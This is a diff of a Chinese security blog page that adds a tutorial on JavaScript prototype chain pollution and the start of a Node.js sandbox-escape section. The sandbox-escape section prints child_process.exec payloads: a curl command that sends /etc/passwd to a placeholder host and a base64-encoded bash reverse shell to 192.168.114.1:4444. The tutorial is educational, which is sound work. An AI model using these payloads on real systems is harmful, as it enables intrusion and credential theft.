@@ -4,9 +4,14 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="总结, Ethe&#39;s blog">
-    <meta name="description" content="
-  d55db17c59acd0a076373f5618149936d6336804120d7706b0bd474d7690c83560f5b1a2978403e63d06e384fd2b3216f60ffceb2be10fe923607">
+    <meta name="keywords" content="js漏洞, Ethe&#39;s blog">
+    <meta name="description" content="原型链污染深入了解JavaScript在JavaScript中，一切皆对象
+当我们创建一个js对象如
+var a &amp;#x3D; &amp;#123;&amp;#125;;
+
+它会拥有一些自带的属性，如
+
+JavaScript中，我们如果要定义一个类，需要以">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -18,7 +23,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>总结 | Ethe&#39;s blog</title>
+    <title>js漏洞 | Ethe&#39;s blog</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
@@ -322,12 +327,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/2.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/6.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">总结</h1>
+                    <h1 class="description center-align post-title">js漏洞</h1>
                 </div>
             </div>
         </div>
@@ -457,8 +462,8 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/%E9%9A%8F%E7%AC%94/">
-                                <span class="chip bg-color">随笔</span>
+                            <a href="/tags/web/">
+                                <span class="chip bg-color">web</span>
                             </a>
                         
                     </div>
@@ -473,28 +478,28 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2021-08-31
+                    2022-02-21
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2022-02-16
+                    2022-02-26
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    4
+                    3.5k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    1 分
+                    14 分
                 </div>
                 
 
@@ -517,18 +522,294 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
-  <script id="hbeData" type="hbeData" data-hmacdigest="3d2af7c13645b12e108ebfa9ae9f9d93df2797ece5065202e5e1d850046acf6f">d55db17c59acd0a076373f5618149936d6336804120d7706b0bd474d7690c83560f5b1a2978403e63d06e384fd2b3216f60ffceb2be10fe923607ba2a3f63da8dddc37422310a5b600da568983241b725ebb5784573b4837f12f9dfee6e1d0dd72e209714b32d93b0ef55fc4e7a89ab29ff4b089ed27a2d7ceb9fc648019985b7390adb30c8609a460946f3062435e69322430a5308708dad4ec31d253a7f50c0d40efb9763bc49f51563d7895f3aeb111974faf9dac8a2c3c3824ca78636021bfd6b5ea6f7b652b789dd74c4a4650f9769ac39412bf77dba8039614a7816ab2c3c4b0dc3cc3c8d2eebc8b88f8ea40ae1bb10c76e607fa8a630542d168a6ae50bcc89de5ff84693b17defce908f8a5bf6309fa24d6ce350cb3ca8adbe5127c64086aa20800d04df45911058fce610491c6975ae1a924cd4901f6a74788827e7e24480e2e6548ba6fdf886aaf6b260658792c19243b331f67fa6cb07f1db1a55274926c816ce8d54f5ef7da0b55c9dd511715b3edfd2114a3c98a7131ab1eccb16401d375549f5fa8d7119af8b9ce652ba14588b606c5fcd1dff4ce9660d3de222482e15a304a5e112eb4f3a6c15bd6ea6627fa2fad47fa71c98bf7e8de3d188024847a5f3942567732d3ea3b7808dc6fb04f2e4e1a105fd3bb9073969c6ed1c884e554f30400bf6a9d5add149fe3b9f270184401c3c174e485188c7ac1984e0d67a1a478848747e7c862e4ce79196b45739a65c80d4a340807428a0cb663e013a226f62c6452998d654025723019424810984d8644456843241b81f93b31d6b62e0e925835559587e9d28921df407dade7f5ff57cdbf580a302c9dff98099c8c6709c5e097943f98a5e5acf496175aa3e021bcac9c8f551befea08d751c926164108f6285b230901fab837ef76cde010a9505a37f1ebd35e637e327b04261283b52c431616922a5447d79146af67d69c3a20cc041957c5b49a1bcb10b8c1a3364627c919ca24082e1be6c50bab5c40b3046c0ca8ffc81d43eb2ffdeee91765ba936d5cc2812f169002f5fd2a1c31fb36b187cc395c19d627de06b6fa1e23faae9536060c63bc2a8dc5cac939755dce2f5c6462fcdc7b24aca17da09a4e752614124669e45267e36b901e9cbb3064e3f260980faf571f8c63311d08358d30377fdb701f26baff3ed841dbc60ef85f8ea6ac432728ae4f43cec3f9214daf1b4512f28a2ee15caefa12717f3267c55ad789bc1ae73a46594b642177318cbdbe574322941391b3888aa0d7572213ac6754bb0fc6f7aafabc38f5e7c8bbebaee0c2fae7583165d60f7c1f45843f21ac318cdf5f18aa18e84539223e44ee228b9f361918713439968d8c2f8f8320b7f2d92ee0a2d5fe30c8b83abf0e8397235d27e60007d8ded1908898bf1e7b06a7c855446e4d7026cf5df83d65506515bd651b7afd573a83fe5a99410299324ef482acd8c902af37151fcbcae541a4114831290147ec6abb1da8e96e2fac437a8eefbcd522f865a869ba6672ebbc2f863f2da081c5452be323f93fc7ca92b15960c03c20280333eb9ab2741da3e0b704e2cf6fb0baecb5e1ab187b8647dfed656fde0f8403fa8513c29cdcd5d1ba622c70400ee30a6250c5ac0788e2d582c480b78e2534173ea824cf3008c777426a934cc3b45c0ba7986b8502b1c485cea2aeb797ad1b11bc9a325b53e57e65c1170d575ecd3facb7fa4c1f71739b71af5c500c9953865fa3fb3b59afc91e5ca83dfbe42dbf0e0287206d10f4117c02af60756e5d12b688cef3347f5d002af507fef80ae4a47565a03555dd72db5c5091874219183eaf07440d05b7acc12bab4f82e08ec2b6c7b8f90fa0b8eeef36e672fd13ae9fe5c4623d10fca00ffcddd381f6e3bdcd61a27208cdc6b85dbef789e547df128b43141236235c3cb5659343975f18599da5bca54677d8bc8fc2ff8a9a045869d7f79ccd9a62f48c5541dcd98bc2913f467c230bc2f66a3caa445d7725b6011aea809d7e110cb3bd2bc0ffc0ec1098f87607c3eac77de16c100ad2207f6ad75c412fdcaed7a110255f4dbc717a6a68eeb745e780c80b8afab0a6913cdc3e2b67c72d33787fafede28615ce6c918077b5a5f6252e8cd842ebcfe76e9b24fc4f2c86649acbb6c15c928defdc024756ac6c3fd89d20873c6beba1648a209b02a52ac915617917b57ef07db9da4d461f1686f865cc12a76a367451661146c94342952dfe978162f69e701a2f4398d0365ad3ac7a35e7e56081048072cfe882c1840cd3072942d7f228c9a643afb974ac87e47309af143c2e4a036af10222abadd2235997aaa516b232fd7c340dd916ed6e7eee5e6640803754d9d7ab41ad394f3b065941bf735593879fa9003eeb3dc1f31cb6d6a78968b0b6721a50e6619c6298075d1c93f5b0876dee14743db1f6f08304be3662f77a739e8955f0a2edcf975625fcbd4defe27919a9be44c1a8ab50d1bc09b06d1918953aeb7d1e361535b11254e839bba2e201167d8efa6f209d8f0b96ae48b54af889f0ad4ea65076220ac96a9c542e59ae171dcabe32a79baa2e7861ce7bb20b2d75ebb78bce3dccbffdbdd972a9beeff3b71d80dac42fc2b054a535b31b6011bebd6c5efb783315951708b99f3cab618f031c417af4712e2b13cbafdeb862a1a29f62e3af64e8114a9ae629984454a4cca3a23b85bff3418ba4d0bed56869e7811d2e05957aec8c697486b5f563f25ae638fee2248f75573e2e2ce8277c4004b9437bf710342af7bc6eaec2772784ce7e9b8db94f05bd079e3adf2e9d655ee4ffe791782eeab1d9d27001465dc4612c3478250a5ee101c300c2b15cb9bd8a39e828049c71e9c3ff086a09a5dd01808f48207bd2ac36c244eb22990d83d9d259fc68ca8c0b4aff01e70f540cdff6a9dcf2d925bdea4fdb6a315307d2ee1411726269c28acb9c13987fbe5c0f31aa83b8a2f2aa9967a29e027d77e00173b7a9e608be34c077f80ec7f5d76d1e63a790a939127d7b9768e1a14f104ae25285bcd91c497b0cfef3f9fefbeb38c1392753c9db034de70630f7e149e3e3f04ba1e461c4974ff45a31e48443208332ef92b11a59883f73862fa8b2dfc64d071655ac37496cb95ca4ae462618bd02cff873301a06784c5f61b1160279528746626737912bff45d588d8d7e0edc43b6fda591d30ca456444e86785fc1f59573f5cac9900a8ff41d774be29dc163b8f2a200e6eb8c0942c0afded44841705292148b3439755fc8e3285a628c6ec7e687d0e72c12201adf3c40988aff236fe4ad5c7ef7acc9c68f49049010fc6be677c3edbdec34209627be6cf6bba5ef6f78875fe9bc6f46f506c04b786e264ace5fcacd79becee463c5fce180dd5fbf65848d191fb56816fcfb833c5e8d78268d9cbf9f85cdf9241cab8672ad2c64e68b798d025fe2b5492870d7d24732ae1a09cfa9666398594e59280d53bcfad84f97b7755219be287a8a0065b425d3178038308728e75456d582ad1121fda1202ef449d0be86fc1314543f96b6f25f7952d6ff419f501eef7fdb399c96d9294f3da85660e222a92b54d0cbe8fbaba6355e934e80b9e10fac5cfea065c9896295f0c492d81c627fd187f4dbbceacb0eee53c173f313b76319d30a065c56712f41e70f925760315f1495a358ff19c16bd30b72c5e1f9e036648c73489d0133a0ee91d26675faf574e0849f38a3fb49b133eb92d433a139f6c56fcf30693cad1d906e1a7dc320eb3f42e32287f9c9578bbcad825aa8a67c5d79bd5e09d1a95b66bff585fb6690f5ef6048d0b5b1b6fb00028b4469de3354b7ad175fcc945cade2d8a1817eda5a0a23bd9102f547df0607a88bca676dba33d2a9521c67f5341189563634e345fdd19010f967d089636f5c4090de66aa97dcccb64a3d39481b7402ec94deb1c6fa98ebd1644b4319022acf9c5a600116b5d5c159f08f4e16c28f8cd86b7505a9dd87c3570b74c4d86b763f1e1dffa5b2ef759b5763cdd4618e5424d00d154165ebeaa20a5a733c85dc27c9d3001c5df80fc0de2acbf9fb858c9eb62dfc6535748aa0b3d5bb394035065671e96b8da3ca8af69ebf13669f02b3aacf9f141ce8beea658e381420d5c8f7dda5836730f7efd08597d1d9e401429322818403f9c75f9732444290679135d73d8beee95e65ad774f573d94478903b686330217749454e47c58945413ee73052b372d3d2f0f392d724aeb8f89f1476e05695422be1a010ef0dbb53a96a748f5ca39afb35513bb4226fb5c0bfb770ff4d7ccce0f1953c6900cb7f0568615587995584aae32a2705c2e807ca04d1ebeed15c564b7a70c272141f77e80b6b4ede6bc0ca5824447232511ea9645cabbdb3c3f47a348e7c44306261011877ca2c03d731415eb2228cfab56e433f97c6073673230dfdfb46277ef2ca07cf1283c3213edf439f640aaad82572acd82e7653f24b08a839be0a0d60bb19da1139afa2ff07eb5552a29976330b9166d1f74cd3c9cc5c717eed15d817cb4ba0d42b965b7532463d64704bc4d5f4ef97e114b1f4c848ef5791e07c5dd01f5c780c6401c293e4a2c6762b9aa5f6a74ee31a8b56b62585ab423f25f2269032100b9a81cb178a0e6f9d4618048fe570a4838d44218f337e6bee0d50f48f36eecf62c2cef3c2d1d5424ee6e382c732e1d3a243c3288a6ee09f703800aedb427bb094fd50ae32748292e3c3740a510048049066d48d91e8ccd61869d31f8628f0e079c08480eff8b91c9dad4f38739048e093bd52d235bac6108cf95208c9d53a554d14df70e86aa18a9a9292e4ddfb964b892444af061a6f9b3c9ab6c5978bac034fdbf54680805d848e9c419c34ac90777a9ddb084f11508b6de3905bd00652e370cd3717a47f49bf4f7b5e813199204d4c410aae6d0edc4065704ec8aa328b6ea91733dc0e944e98b0f27f6fbf43da97e06daef754b3989ad91f948a0f5dbe7e0185254c41e508f3f280d53f52f4dcd702379862a190007051ef757dd8d4331037e513fb84f49b8131c14db1d27e17fd4c643d4d466e31ee28f989b44a41b6cfc6cd2392ac4503c384042fb56478fb2620fdfa8b0fcb0850363e01ab84bf53999276044e22dc3d8331f3f74fa8bcdd46eda7d99c82c1f6e5480bbb2486395648cba8e5e9f2595c0bf5c8bc4d3ac154339c8e4c894d86d3c9e058dc1d0a148a485a85bad260e2546e451ef4def396471badb83d0575b9645148a74f3accad2d0902cbaa3869f67bf897333a02dee6bc7234758377bb404a81b49f004552ef03eaa72fcd80b6b139ca1f61fe2c8fd4e1bbebd4e14e908df46fdf2c29171982e13f98ae2943ea1c94d70c9b3903dc084c028c826fd34f7f4d8e749657b875721c43a77a1c7c23a073c5f6fade283fd44d484a1cb14e62a6da7732842b01d4e0f1ccd13ca352ef72b67c7f6866c538e42e9570e6b30783b62aab0ec39179f863529d409edcb9149ec4fa4fe07820be5a07ea3fa7f22cca3445f9436fd3b026df631fb17fc71e755bd0f78ea7f8e6356c3b22514e8c7df13cba640688f7ff5ea484a9ccdbf4515a3042178562a4eff441fd92dce371ec1108c4d438b1955125651e64d2e193cf5f761265939aa561c25609e20327a5c36aeac1accc9d3a090bcdc265e304e4248c4ef5c8d96fb598afe2ddc0d46ac36f3d45df195bb37b95367b07b386b7238d43f97245a527dc57f6d314013ad7ada565acbb4b6b35479072370c72505bd5b20298f4941440fb62e85fd6c282a84c12677946dd8fa5519ba354e4dd2f2f31ecda94a29de3cdaf69fec0613fb36bb3a33dae3fd1a38aa578a15f76ab7a35ce8b7169585c0b327f591e4ffadc3cf4c46115ed6dafdfef8521207987108fdebcc1bdc9f5104ad9db6e71570de8e16f783e506cded9ce64359d3237558c198b9e78b9fdd3b946d6784c02a68d664c7cab2e2498ee7739d63540866389a365215bf901abbb30ed1ba5dbfc84933e3b22074b89ad9c25dc4b8502fd8ca6bad6d1b42d574ca616bc4e1a553bb6adbaa27fc198e604131414a04320d1ade0406de1c1d3bf541396226e98616e30653f129937ed4c5ceb48cac99472daf3abd22b092bc622ed9024849a89d112eb11d69ecf83d7d62234cea16a4cc6160ec9a30e79147c398384054a49c78722a9960ce9039a90cefbfd792e84c3db3dc8e8ff811c2072daa55c678c6ab0dbeef61a5dd8115c0eab576315dd4ed9de4374c8fe1aab6bbc3cfebe8aa9c49bdb145f5b412d3965916dabe38c9ee6dcabf49d57f840abab4f8cabbf3ab4472096e32cf1dfc9277389a5be4b9fccf9ef497c4cdf4e4cbc4a69b5d059470271f8def4115fdf5a7da235d29bda4cbece356860353f32130c8c74302d25582e57b520f4a1debe53498af08454f6d89dc063a12f5a21b168eb49305fc9dcc37977bcffe168e2772ec3b2e753a76e0f6837d0fd8fbd7573c29dd34f982d544cf9ade4ef65214432a82e3bb6df8a4120bcda5a8580ffae2de9e6e08008fb33e940b662044eac0b4102513a7a6572740d1f3226146ab67c0963734f963012ec214ef8351cd7bc228f191772b1ab2916daaa83cf6ca601adbca734ca1821be74619450fbd6908a1a6b32e0008a17b5ef3ec2fdc12299b68cec6ec9939cb3c4bf2df13d4ef97a1204167050d5b2833a238502b1d6cf401c28389d5dcba6df7d206a2649003864589cd05d0cff501763ad092e0d657f2d9b69a581aa2506d166c81fa526dab52c09e4f22d211de38bdb5471fd9c182a4f4272b4ce1addd8adbef2341f3217040fc01e15767c77e946df5ca46939119a44be81399a25bec8c7ca9678568e258bf87b343e0eacf7dd4d41e1d00ccdb77d4b3f89f89630ccf8557191772e4dd7c22fb023711025664b2289b601d2f3680d0bb6089f3e2b2b497967a894ad922a1592a24c2153d29630729b67afcf33853e23e05917463e247858048845447fb4971c876ba5e5c055d213b3735c0b2d93a3c8ff98b747960a22a57a4f391c8b1d54cf5455e8fec809a7bae74a56b0e4a2066845a3bc3059abce1c6d8cb39b10c594890e9807a2d6caa04739d4e67db27c4473dfafaaababdfd8217cff55a9e3a3c69b2181982536c621b7dce5adb87bd9264813bf5258f6aba7032630a306d0793cf3c8b437cac230633f84febdaf7da0f913509ac59b13e173afd9bb8ccf4732a4876ea503a944a668ca9d30a91b9b3e161b4c947395b998ed8f046e294156a579bb5f61c556b85dad1030eba08962ff33cd2e6ab4adc2dea6ac0a21828aaa90f5a96cb79156b3e7ebd2f279eb83bd3b5402c4cbd1a0ebeddf09462d715656f038d9f8f2ea3e877806bf23765089f08edcb71343db05fca9fcf71fc224f3605899fcdf14b3298316186b81b0746bc133872316863d872792f199bb0eece854e8109fa154c7ec3e0f3f2efa1c07620fcd1f855a893f824fe384e8e8857bba512ed311dab3c55832ab9daa6b843f323f395afd9e4ca4883fe341c5b9272e1b7a1046c88e94fb72bad75ce7a91476b734158fa4ac2b1a84035afdb901e34fd6b3a762e5e0acf667b8a8b9835b53560bc4ca1f3e133a263fb21ffe5b3bab2fbbc94241c7286cfff27b750ebf850023f1831ebda0a3e7afa1275d734d1c5b4107438f0ab99ebe936bac2d0e8fc8a4ae7ef8154efd3310c6781063c02b2c2a541a7d177be51f23cc33790be88f179d57780bf5df4286a1b43d0bdfa8a78bafa528eae7ce463c4ad9f5bb675cc915eded3b5b4509032e35c350b39128c19f352be9e5cade7df143009d1a3e768cb2ba9829aa420539793dbe177077ccf365154a809082bdb7570240fa9157985dfef43b38cf92f12f6ca1a8a8908b8387f1ae70f8a42e849a0ae05f9c3dcb28753acf4164fde144921822648011a2767f4d3a557dd9d089891b1d586f258bca2dd2b7c9b757ae35aa8f574dec11dac6d966a868ec23be70c7a6fc367c81ac8667e0d4db05767f57d3098b787c73d5441b29ca26264286b63ff8343c89317fff2a4498b3d9193bedbb54905acd01941935a7acdb2a5b3b6385e2af3cfc2aef58302d203b74effaa344f392072916a5e8fca49b14e9ba64876fb2ff993c7be46532bff510d1ecfc83f3c407be3656731cef2d54a5a152dcbdae14523e26a96cc1f642948227c1c5108fa8dc91a1f78e5ecb64b9316198d86c62fafc2ed0df1cdd109c3fb06b0bc136766df33ddb4c537d8972509ef662ff8c66ff7a92a488edd65f934741afd3475bca472951895ab06ac0162efad0685ac336ccaea38c1b5ca687e40bbf7a31fdebbf3b4382a58afcb4451b7802e17bbdfa65536ae9c10f2374afad212993485035bf92a1cbde566394a3ffe25795400d055e3e538b6ec8a41c09239012915efd98a6bcd1d3e212f20ad9593a41df245499dd0e2a1bc2fcdda425ea6a3729ddbbf7242d9fd36f5ff5e2a172f8250305eb1c4597e3f436926ce5650f99d3745f6d9f5780c3b8f1319da6f79d1f701c89962c7deb3eff5ce2dbf17cf3248aead9e59e48fae8b68c4560bd5a70b8d60b71df78dd474e5e88972989cad3c9ce9a439b2aca23f6e7d4dd7ec030d2254b81cbf5e5219f2633e7d6dd8c0e5fc273a819a39961979011166314b1958b11f4ddd3a91784cd48d5a296e6a1db45feba31a21cab31177b0498d2992072cc4f61046c773d69a436fda650</script>
-  <div class="hbe hbe-content">
-    <div class="hbe hbe-input hbe-input-default">
-      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
-      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
-        <span class="hbe hbe-input-label-content hbe-input-label-content-default">猜猜看</span>
-      </label>
-    </div>
-  </div>
-</div>
-<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">
+                <h1 id="原型链污染"><a href="#原型链污染" class="headerlink" title="原型链污染"></a>原型链污染</h1><h2 id="深入了解JavaScript"><a href="#深入了解JavaScript" class="headerlink" title="深入了解JavaScript"></a>深入了解JavaScript</h2><p>在JavaScript中，一切皆对象</p>
+<p>当我们创建一个js对象如</p>
+<pre class="language-none"><code class="language-none">var a &#x3D; &#123;&#125;;</code></pre>
+
+<p>它会拥有一些自带的属性，如</p>
+<p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/js/image-20220221163610282.png" alt="image-20220221163610282"></p>
+<p>JavaScript中，我们如果要定义一个类，需要以定义“构造函数”的方式来定义：</p>
+<p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/js/image-20220221163750576.png" alt="image-20220221163750576"></p>
+<p>这里test()函数的内容其实就是test类的构造函数</p>
+<p>而<strong>constructor</strong>这个属性就是用于查看对象的构造函数</p>
+<p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/js/image-20220221164147637.png" alt="image-20220221164147637"></p>
+<p>接下来我们要知道<strong>prototype</strong>和**<em>_proto</em>_**又是什么</p>
+<p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/js/787416-20160323103557261-114570044.png" alt="img"></p>
+<p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/js/787416-20160323103622089-1134417169.png" alt="img"></p>
+<p>从类的角度讲，<code>prototype</code>是其一个属性，所有类实例化的对象，都将拥有这个属性中的所有内容，包括变量和方法。但是类所实例化的对象并不能通过prototype访问原型，所以才有<code>__proto__</code>出现，且一个对象的<strong>proto</strong>属性，指向这个对象所在的类的prototype属性。</p>
+<p>这个特性被用于实现JavaScript中的继承机制，为什么我们定义的a有 toString() 属性？这正是继承机制的作用。</p>
+<p>对于a而言有个__proto__属性指向window.Object.prototype</p>
+<p>这样你在调用a.toString() 的时候，a本身没有 toString，就去 a.<em>_<em>proro</em></em>_ 上面去找 toString。</p>
+<p>所以你调用 a.toString 的时候，实际上调用的是 window.Object.prototype.toString</p>
+<p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/js/image-20220221172804302.png" alt="image-20220221172804302"></p>
+<p>对于p神的例子我的理解是对Foo类的父类添加一个show函数，同样是利用继承来实现存在foo.show()</p>
+<p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/js/image-20220221173043928.png" alt="image-20220221173043928"></p>
+<p>总结一下</p>
+<ol>
+<li><code>prototype</code>是一个类的属性，所有类对象在实例化的时候将会拥有<code>prototype</code>中的属性和方法</li>
+<li>一个对象的<code>__proto__</code>属性，指向这个对象所在的类的<code>prototype</code>属性</li>
+<li>类在运行程序运行时是可以修改的</li>
+</ol>
+<h2 id="JavaScript的原型与原型链"><a href="#JavaScript的原型与原型链" class="headerlink" title="JavaScript的原型与原型链"></a>JavaScript的原型与原型链</h2><p>这种继承机制使得JavaScript中有原型和原型链的存在</p>
+<p><strong>原型</strong></p>
+<p>①所有<code>引用类型</code>都有一个<code>__proto__(隐式原型)</code>属性，属性值是一个普通的对象<br>②所有<code>函数</code>都有一个<code>prototype(原型)</code>属性，属性值是一个普通的对象<br>③所有<code>引用类型的__proto__</code>属性<code>指向</code>它<code>构造函数的prototype</code>**</p>
+<p><strong>原型链</strong></p>
+<p>当访问一个对象的某个属性时，会先在这个对象本身属性上查找，如果没有找到，则会去它的__proto__隐式原型上查找，即它的构造函数的prototype，如果还没有找到就会再在构造函数的prototype的__proto__中查找，这样一层一层向上查找就会形成一个链式结构，我们称为原型链。</p>
+<p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/js/787416-20160322110905589-2039017350.png" alt="什么是原型链？"></p>
+<p>举例：</p>
+<p>若有代码</p>
+<pre class="language-none"><code class="language-none">function Parent(month)&#123;
+    this.month &#x3D; month;
+&#125;
+var child &#x3D; new Parent(&#39;Ann&#39;);
+console.log(child.month); &#x2F;&#x2F; Ann
+console.log(child.father); &#x2F;&#x2F; undefined</code></pre>
+
+<p>则在child中查找某个属性时会</p>
+<p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/js/20180620134143385" alt="这里写图片描述"></p>
+<h2 id="什么是原型链污染"><a href="#什么是原型链污染" class="headerlink" title="什么是原型链污染"></a>什么是原型链污染</h2><p>Object.prototype是一个对象，用于表示Object的原型对象。几乎所有的JavaScript对象都是Object的实例，其原型链上最后一个就是指向Object.prototype。</p>
+<p>所以我们可以通过修改Object.prototype来实现对变量的修改</p>
+<p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/js/image-20220221182419388.png" alt="image-20220221182419388"></p>
+<p>可以看到我们将a.<em>_proto</em>_.bar 设置为2</p>
+<p>新定义的变量也有了bar属性，且为2</p>
+<p>那么，在一个应用中，如果攻击者控制并修改了一个对象的原型，那么将可以影响所有和这个对象来自同一个类、父祖类的对象。这种攻击方式就是<strong>原型链污染</strong>。</p>
+<h2 id="原型链污染的利用"><a href="#原型链污染的利用" class="headerlink" title="原型链污染的利用"></a>原型链污染的利用</h2><p>当存在控制数组（对象）的“键名”的操作时，我们就可以设置__proto__的值，从而实现原型链污染</p>
+<h3 id="最显然的情况"><a href="#最显然的情况" class="headerlink" title="最显然的情况"></a>最显然的情况</h3><pre class="language-none"><code class="language-none">obj[a][b] &#x3D; value
+obj[a][b][c] &#x3D; value</code></pre>
+
+<p>如果控制了a,b,c及value就可以进行原型链污染的攻击,</p>
+<p>可以控制<code>a=__proto__</code></p>
+<h3 id="利用特殊的api"><a href="#利用特殊的api" class="headerlink" title="利用特殊的api"></a>利用特殊的api</h3><ul>
+<li>对象merge</li>
+<li>对象clone（其实内核就是将待操作的对象merge到一个空对象中）</li>
+</ul>
+<p>例如</p>
+<pre class="language-none"><code class="language-none">function merge(target, source) &#123;
+	console.log(target[key], source[key])
+    for (let key in source) &#123;
+        if (key in source &amp;&amp; key in target) &#123;
+            merge(target[key], source[key])
+        &#125; else &#123;
+            target[key] &#x3D; source[key]
+        &#125;
+    &#125;
+&#125;</code></pre>
+
+<p>这时如果key是__proto__不就可以直接修改其原型了吗</p>
+<p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/js/image-20220221200009010.png" alt="image-20220221200009010"></p>
+<p>但是这里并没有成功，这是因为，我们用JavaScript创建o2的过程（<code>let o2 = &#123;a: 1, &quot;__proto__&quot;: &#123;b: 2&#125;&#125;</code>）中，<code>__proto__</code>已经代表o2的原型了，此时遍历o2的所有键名，你拿到的是<code>[a, b]</code>，<code>__proto__</code>并不是一个key，自然也不会修改Object的原型。</p>
+<p>只有经过JSON.parse解析,才能让<code>__proto__</code>代表了一个key</p>
+<p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/js/image-20220221200323952.png" alt="image-20220221200323952"></p>
+<p>成功污染</p>
+<p>参考文章：</p>
+<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html">深入理解 JavaScript Prototype 污染攻击 | 离别歌 (leavesongs.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/xiaoermingn/article/details/80745117?ops_request_misc=%7B%22request_id%22:%22164543411816780274140815%22,%22scm%22:%2220140713.130102334.pc_all.%22%7D&request_id=164543411816780274140815&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-1-80745117.pc_search_result_cache&utm_term=%E5%8E%9F%E5%9E%8B%E9%93%BE&spm=1018.2226.3001.4187">【原型和原型链】什么是原型和原型链_沉迷学习 日渐消瘦-CSDN博客_原型链</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45551083/article/details/109589386?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_title~default-1.pc_relevant_aa&spm=1001.2101.3001.4242.2&utm_relevant_index=3">原型链污染漏洞(一)_lonmar的博客-CSDN博客</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/6e623e9debe3">从杭电hgame-week4学原型链污染 - 简书 (jianshu.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/shuiyi/p/5305435.html">三张图搞懂JavaScript的原型对象与原型链 - 水乙 - 博客园 (cnblogs.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/a3320315/article/details/102883325">JavaScript Prototype污染攻击（CTF 例题分析）_a3320315的博客-CSDN博客</a></p>
+<h1 id="node-js-沙盒逃逸"><a href="#node-js-沙盒逃逸" class="headerlink" title="node.js 沙盒逃逸"></a>node.js 沙盒逃逸</h1><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>在nodejs当中了，eval始终存在着一定的问题，能够出乎意料的执行系统命令。</p>
+<pre class="language-none"><code class="language-none">对于存在利用可能性的eval函数，可以使用chile_process.exec来间接调用&#x2F;bash.sh。
+它是一个bash解释器，可以执行系统命令。在eval函数的参数中可以构造require(&#39;child_process&#39;).exec(&#39;&#39;);来进行调用。
+
+like：
+
+读取文件：
+
+require(&#39;child_process&#39;).exec(&#39;curl -F &quot;x&#x3D;&#96;cat &#x2F;etc&#x2F;passwd&#96;&quot; http:&#x2F;&#x2F;vps&#39;);;   
+
+反弹shell：  
+
+q&#x3D;require(&#39;child_process&#39;).exec(&#39;echo YmFzaCAtaSAmZ3Q7JiAvZGV2L3RjcC8xOTIuMTY4LjExNC4xLzQ0NDQgMCZndDsmMQ&#x3D;&#x3D;|base64 -d|bash&#39;);  
+
+即bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.114.1&#x2F;4444 0&gt;&amp;1  </code></pre>
+
+<p>类eval函数：</p>
+<pre class="language-scss" data-language="scss"><code class="language-scss">setInteval(some_function, 2000)
+
+setTimeout(some_function, 2000);
+
+相当于匿名函数，即php当中create_function。</code></pre>
+
+<p>eval/Function 算是动态执行 JS，但无法屏蔽当前执行环境的上下文，但 <a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=node&spm=1001.2101.3001.7020">node</a>.js 里提供了 vm 模块，相当于一个虚拟机，可以让你在执行代码时候隔离当前的执行环境，避免被恶意代码攻击。</p>
+<p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/js/image-20220221225320251.png" alt="image-20220221225320251"></p>
+<p>在这段代码中，我们明明定义了y=2但仍然显示y不存在，这正是vm的作用</p>
+<p>vm.runInContext()方法用于编译代码。它在contextifiedObject的上下文中运行代码，然后返回输出。此外，正在运行的代码无法访问本地范围，并且以前使用vm.createContext()方法将contextifiedObject对象上下文化。</p>
